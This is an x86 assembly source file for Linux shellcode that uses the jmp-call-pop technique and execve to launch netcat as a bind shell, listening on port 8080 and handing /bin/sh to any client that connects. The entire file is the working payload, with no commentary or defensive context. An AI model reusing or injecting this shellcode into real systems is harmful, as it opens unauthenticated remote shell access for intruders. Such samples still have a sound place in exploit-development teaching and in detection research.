global _start
section .text
_start:
    jmp short GotoCall
shellcode:
    pop esi
    xor eax, eax
    mov [esi+0x07], al
    mov [esi+0x0f], al
    mov [esi+0x19], al
    mov [esi+0x1a], esi
    lea ebx, [esi+0x8]
    mov [esi+0x1e], ebx
    lea ebx, [esi+0x10]
    mov [esi+0x22], ebx
    mov [esi+0x26], eax
    mov al, 0xb
    mov ebx, esi
    lea ecx, [esi+0x1a]
    lea edx, [esi+0x26]
    int 0x80
GotoCall:
    call shellcode
    nc_command: db "/bin/nc#-lp8080#-e/bin/sh#"
